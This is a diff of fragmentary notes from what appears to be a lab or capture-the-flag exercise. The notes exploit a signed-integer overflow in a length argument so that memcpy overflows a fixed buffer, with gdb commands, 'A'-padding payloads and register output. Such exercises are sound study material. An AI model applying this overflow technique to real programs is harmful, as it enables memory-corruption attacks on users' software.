@@ -26,17 +26,20 @@ run "9" $(python -c 'print "A" * 40')
 36 is the maximum number of bytes that can be copied into the buffer (9 * 4).
 
  -2^31 to 2^31 – 1
- 
  ```
 
-The "memcpy" function is vulnerable to buffer overflow attacks if the size of the destination buffer is smaller than the size of the source buffer. 
+The "memcpy" function is vulnerable to buffer overflow
 
 
+10000000000000000000000000001011
 
+Decimal from signed 2's complement
+-2147483637
 
+r -2147483637 $(python -c 'print "A"*40 + "FLOW"')
 
-
-
+i r $ecx
+ecx            0x2c	44
 
 
 
